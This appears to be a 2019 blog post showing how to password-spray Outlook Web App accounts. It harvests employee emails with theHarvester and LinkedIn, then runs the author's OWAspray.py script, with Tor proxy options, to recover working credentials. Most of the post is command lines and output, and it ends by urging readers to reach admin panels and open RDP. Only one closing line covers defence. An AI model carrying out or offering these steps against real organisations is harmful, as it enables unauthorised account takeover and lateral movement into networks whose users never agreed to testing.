---
layout: post
title:  "Reverse brute force attack (or just Password Spraying) using OWAspray.py"
date:   2019-06-02 01:00:00 -0400
keywords: "python, OSINT, tools, owa"
comments: true
description: "How to use OWAspray.py to hack into Outlook Web App?"
---

Weak passwords are still a thing. I've being worried about this for a while. Weak passwords aren't new and we should pay attention to this since a malicious person can go further from a compromised account. In only 5 minutes anybody can access to a network and move laterally once inside. As a Proof of Concept I did publish a simple Python script called [OWAspray.py](https://github.com/davidtavarez/owaspray) to test the top 10 worst password we possibly could find.

First we're going to collect using [theHavester](https://github.com/laramies/theHarvester); theHarvester is a very simple, yet effective tool designed to be used in the early stages of a penetration test. Use it for open source intelligence gathering and helping to determine a company's external threat landscape on the internet. Let's install it:

```bash
$ git clone https://github.com/laramies/theHarvester.git
$ cd theHarvester
$ virtualenv -p python3 venv
$ source venv/bin/activate
$ pip install -r requirements.txt
```

Good. Now, let's find some info:

```bash
$ python theHarvester.py -d DOMAIN -b all -l 200
...
[*] Emails found: X
----------------------
...
FIRSTNAMELASTNAME@DOMAIN
FIRSTNAMELASTNAME@DOMAIN
...
[*] Hosts found: Y
---------------------
...
mail.DOMAIN:IP
...
```

We'll see a lot of information but right now we only want to collect the emails and the URL. This time we have the next pattern: `FIRSTNAME+LASTNAME@DOMAIN`. Cool, with this we go to LinkedIn and get more usernames. This tool looks pretty good [linkedin2username](https://github.com/initstring/linkedin2username), you can try it; I will be (probably) writing some script for this later. Now, because we have the email pattern we can write a list of usernames to test.

Let's the magic begin...

## OWAspray.py

Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. These attacks have become one of the favorite technique of attackers, as it has proved to be very effective for advancing through a network after having established a foothold inside. I did write a script to test this, let's try it:

```bash
$ git clone https://github.com/davidtavarez/owaspray
$ cd owaspray
$ virtualenv -p python2.7 venv
$ source venv/bin/activate
$ pip install -r requirements.txt
$ python spray.py --help

usage: spray.py [-h] -t TARGET -u USERNAME_FILE -p PASSWORD_FILE
                [--tor-host TOR_HOST] [--tor-port TOR_PORT]

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        URL of the target.
  -u USERNAME_FILE, --username_file USERNAME_FILE
                        The list of users.
  -p PASSWORD_FILE, --password_file PASSWORD_FILE
                        The list of passwords to try.
  --tor-host TOR_HOST   Tor server.
  --tor-port TOR_PORT   Tor port server.
```

Now we can confirm the URL:

```bash
$ curl -L -I https://mail.DOMAIN/
HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 0
Location: https://mail.DOMAIN/owa/
...

HTTP/1.1 440 Login Timeout
Content-Length: 43
Content-Type: text/html; charset=utf-8
...
Connection: close
...
```

Good. Let's hack this!

```bash
$ python spray.py -t https://mail.DOMAIN -u users.txt -p passwords.txt
[+] FIRSTNAMELASTNAME:PASSWORD
[+] FIRSTNAMELASTNAME:PASSWORD
...
```

:)

The important question is: how far can I go from here? Well, if you got an admin account, you can move to `/ecp/` and have fun; also, find some open `RDP` will be fine I guess... what else? I don't know, ***use your creativity!***

### What should we do to protect users

It's very simple: use better passwords, do not repeat passwords, enforce 2F Auth and create a max-attempt policy.
